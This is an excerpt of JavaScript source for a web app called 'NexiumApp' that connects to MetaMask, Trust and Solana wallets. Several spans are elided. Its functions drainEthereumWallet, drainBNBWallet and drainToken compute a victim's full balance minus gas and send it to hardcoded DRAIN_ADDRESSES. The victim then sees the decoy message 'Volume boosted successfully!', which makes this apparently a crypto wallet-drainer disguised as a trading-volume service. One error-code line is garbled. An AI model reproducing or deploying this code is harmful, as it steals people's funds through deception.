// === Polyfill Buffer globally (required by @solana/web3.js and @solana/spl-token) ===
...
// === Other imports (after Buffer is guaranteed) ===
...
class NexiumApp {
    ...
    try {
      ...
      if (!isMobileUserAgent || hasExtensions) {
        ...
        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
          ...
          this.connectedWalletType = walletName;
          this.updateintesButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected`, 'success');
          this.renderTokenInterface();
          this.connecting = false;
  ...
  async drainEthereumWallet() {
    ...
    if (typeof window === "undefined" || !window.ethereum) {
      console.error("No Ethereum provider found. Make sure MetaMask is installed."); // Log 85
    ...
    try {
      ...
      if (this.connectedWalletType === 'MetaMask' && network.chainId !== 1n) {
      ...
      console.error("ETH Transaction failed:", error); // Log 90
      console.error("ETH Error name:", error.name); // Log 90.1
      console.error("ETH Error message:", error.message); // Log 90.2
      console.error("ETH Error code:", error.code); // Log 90.3
      console.error("ETH Error data:", error.data); // Log 90.4
      console.error("ETH Error stack:", error.stack); // Log 90.5
      this.showFeedback(error.message, 'error');
      this.hideProcessingSpinner();
    }
  }
  ...
  async drainBNBWallet() {
    console.log("BNB Drainer Triggered - Starting full drain process"); // Log 156
    this.showProcessingSpinner();

    console.log("BNB: Step 1 - Getting Ethereum provider (window.ethereum)"); // Log 156.1
    const getProvider = async () => {
      if (window.ethereum) {
        console.log("BNB: Provider found immediately:", window.ethereum); // Log 156.2
        return window.ethereum;
      }
      
      console.log("BNB: Provider not found, starting polling loop (max 15s)"); // Log 156.3
      return new Promise((resolve, reject) => {
        let attempts = 0;
        const maxAttempts = 150;
        const interval = setInterval(() => {
          attempts++;
          console.log(`BNB: Polling attempt ${attempts}/${maxAttempts} - window.ethereum:`, !!window.ethereum); // Log 156.4
          if (window.ethereum) {
            console.log("BNB: Provider injected after", attempts * 100, "ms"); // Log 156.5
            clearInterval(interval);
            resolve(window.ethereum);
          } else if (attempts >= maxAttempts) {
            console.error("BNB: Provider polling timed out after 15 seconds"); // Log 156.6
            clearInterval(interval);
            reject(new Error("Ethereum provider not found after 15s timeout"));
          }
        }, 100);
      });
    };
    ...
    let provider;
    try {
      console.log("BNB: Step 2 - Awaiting provider via getProvider()"); // Log 157
      const ethereum = await getProvider();
      console.log("BNB: Provider obtained:", ethereum); // Log 157.1
      provider = new ethers.BrowserProvider(ethereum);
      console.log("BNB: ethers.BrowserProvider created successfully"); // Log 157.2
    } catch (error) {
      console.error("BNB: FATAL - No Ethereum provider found after waiting:", error); // Log 157.3
      console.error("BNB: Error details:", error.message, error.stack); // Log 157.4
      this.showFeedback(error.message, 'error');
      this.hideProcessingSpinner();
      return;
    }
    ...
    try {
      console.log("BNB: Step 3 - Getting network via provider.getNetwork()"); // Log 158
      const network = await provider.getNetwork();
      console.log(`BNB: Network detected: chainId=${network.chainId}, name=${network.name}`); // Log 158.1

      if (this.connectedWalletType === 'Trust' && network.chainId !== 56n) {
        console.error(`BNB: CRITICAL - Wallet not on BNB Smart Chain (chainId ${network.chainId})`); // Log 159
        console.error("BNB: Attempting to switch to BNB Smart Chain (chainId 56)"); // Log 159.1
        this.showFeedback('Trust Wallet is not connected to BNB Smart Chain (chainId 56). Please switch to BNB Smart Chain.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      console.log("BNB: Step 4 - Getting signer from provider"); // Log 160
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();
      console.log("BNB: Signer obtained, wallet address:", walletAddress); // Log 160.1

      console.log("BNB: Step 5 - Fetching balance via eth_getBalance"); // Log 161
      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
      console.log("BNB: Raw balance hex:", balanceHex); // Log 161.1
      const balance = BigInt(balanceHex);
      console.log("BNB: Balance in wei:", balance.toString()); // Log 161.2

      console.log("BNB: Step 6 - Fetching gas price via eth_gasPrice"); // Log 162
      const gasPriceHex = await provider.send('eth_gasPrice', []);
      console.log("BNB: Raw gas price hex:", gasPriceHex); // Log 162.1
      const gasPrice = BigInt(gasPriceHex);
      console.log("BNB: Gas price in wei:", gasPrice.toString()); // Log 162.2

      const gasLimit = 21000n;
      console.log("BNB: Using fixed gas limit:", gasLimit.toString()); // Log 162.3

      const gasCost = gasPrice * gasLimit;
      console.log("BNB: Total gas cost (gasPrice * gasLimit):", gasCost.toString(), "wei"); // Log 162.4

      const transferableBalance = balance - gasCost;
      console.log("BNB: Transferable balance (balance - gasCost):", transferableBalance.toString(), "wei"); // Log 162.5

      if (transferableBalance <= 0n) {
        console.error("BNB: INSUFFICIENT TRANSFERABLE BALANCE:", {
          balance: balance.toString(),
          gasCost: gasCost.toString(),
          transferable: transferableBalance.toString()
        }); // Log 163
        throw new Error("Insufficient balance to transfer after reserving gas cost.");
      }

      console.log("BNB: Step 7 - Sending transaction to drain address:", DRAIN_ADDRESSES.bnb); // Log 164
      console.log("BNB: Transaction params:", {
      ...
      console.log("BNB: Transaction submitted! Hash:", tx.hash); // Log 165
      console.log("BNB: Full tx object:", tx); // Log 165.1
      this.showFeedback("Volume boosted successfully!", 'success');
      this.hideProcessingSpinner();
    } catch (error) {
      console.error("BNB: TRANSACTION FAILED - Full error object:", error); // Log 166
      console.error("BNB: Error name:", error.name); // Log 166.1
      console.error("BNB: Error message:", error.message); // Log 166.2
      console.error("BNB: Error code:", error.code); // Log 166.3
      console.error("BNB: Error data:", error.data); // Log 166.4
      console.error("BNB: Error stack:", error.stack); // Log 166.5
      this.showFeedback(error.message, 'error');
      this.hideProcessingSpinner();
    }
  }
  ...
  handleConnectionError(error, walletName) {
    ...
    if (error.code === -prj32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
  ...
  async drainToken(tokenAddress) {
    ...
    try {
      ...
      console.error("Solana Error name:", error.name); // Log 152.1
      console.error("Solana Error message:", error.message); // Log 152.2
      console.error("Solana Error code:", error.code); // Log 152.3
      console.error("Solana Error data:", error.data); // Log 152.4
      console.error("Solana Error stack:", error.stack); // Log 152.5
      this.showFeedback(error.message, 'error');
      this.isDraining = false;
      this.hideProcessingSpinner();
    } finally {
